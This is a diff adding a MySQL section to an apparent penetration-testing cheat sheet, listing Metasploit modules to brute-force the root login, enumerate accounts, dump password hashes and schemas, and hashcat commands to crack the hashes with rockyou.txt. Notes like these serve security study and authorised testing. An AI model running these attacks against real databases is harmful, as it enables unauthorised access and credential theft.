@@ -147,6 +147,36 @@ curl http://<ip>/<directory>/
 - Check if directory listing (Apache) is enabled i.e. `Index of /<directory>`.
 
 ## MySQL
+```
+use auxiliary/scanner/mysql/mysql_version
+```
+```
+use auxiliary/scanner/mysql/mysql_login
+set USERNAME root
+set PASS_FILE <wordlist>
+```
+- Focus on `root` account.
+
+```
+use auxiliary/admin/mysql/mysql_enum
+set USERNAME <username>
+set PASSWORD <password>
+```
+- Needs credentials.
+- Performs account enumeration - hashes, privileges.
+  - Try https://crackstation.net/ for hash-cracking.
+  - Hashcat works too
+    - `echo <hash> > hash`
+    - `hashcat -m300 -a0 hash /usr/share/wordlists/rockyou.txt`
+    - `cat .hashcat/hashcat.potfile`
+
+```
+use auxiliary/admin/mysql/mysql_sql
+use auxiliary/scanner/mysql/mysql_file_enum
+use auxiliary/scanner/mysql/mysql_hashdump
+use auxiliary/scanner/mysql/mysql_schemadump
+use auxiliary/scanner/mysql/mysql_writable_dirs
+```
 
 ## Port Scanning
 ```
